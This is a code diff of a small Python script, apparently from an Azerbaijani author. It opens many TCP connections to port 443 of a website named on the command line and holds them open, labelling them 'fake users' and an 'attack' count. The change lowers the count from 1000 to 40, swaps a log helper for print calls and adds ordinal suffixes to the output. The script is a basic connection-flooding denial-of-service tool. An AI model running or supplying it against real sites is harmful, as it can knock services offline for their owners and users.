@@ -1,9 +1,5 @@
 import socket
 import sys
-printLog = 2
-def log(text, lvl=1):
-    if printLog >= lvl:
-        print(text)
 attackList = []
 HTTPHeaders = [
     "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/41.0 Firefox/42.0", # asagida alternativler movcuddur ( 11-ci setir)
@@ -19,16 +15,24 @@ HTTPHeaders = [
     # en-US,en;q=0.5
 ]
 hostName = sys.argv[1]
-attackCount = 1000 # buradan hucum sayini artirin.
-log("{} saytina {} eded fake user gonderilir.".format(hostName, attackCount))
+attackCount = 40 # buradan hucum sayini artirin.
+print("{} saytina {} eded fake user gonderilir.".format(hostName, attackCount))
 for i in range(1,attackCount+1):
+    d = list(str(i))
+    if((d[-1]=="1" or d[-1]=="2" or d[-1]=="5" or d[-1]=="6" or d[-1]=="7" or d[-1]=="8") or (d[-1]=="0" and (d[-2]=="2" or d[-2]=="4" or d[-2]=="5" or d[-2]=="6" or d[-2]=="7" or d[-2]=="8" or d[-2]=="9" or(d[-2]=="0" and d[-3]=="0")))): j = "ci"
+    else: j = "cu"
     try:
-        log("Artiq {} qosulma mumkun oldu".format(i), lvl=2)
+        print("{}-{} user gonderildi".format(i,j))
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(4)
         s.connect((hostName, 443))
     except socket.error:
-        log("{} user yeterlidir :)".format(i))
+        if i> 1:
+            print("{} user yeterlidir :)".format(i))
+            break
         break
     attackList.append(s)
-log("{} saytina ugurla {} eded fake user gonderildi.".format(hostName, i))
+if i==1:
+    print("Xeta bas verdi. Internet baglantinizi yoxlayin")
+else:
+    print("{} saytina ugurla {} eded fake user gonderildi.".format(hostName, i))
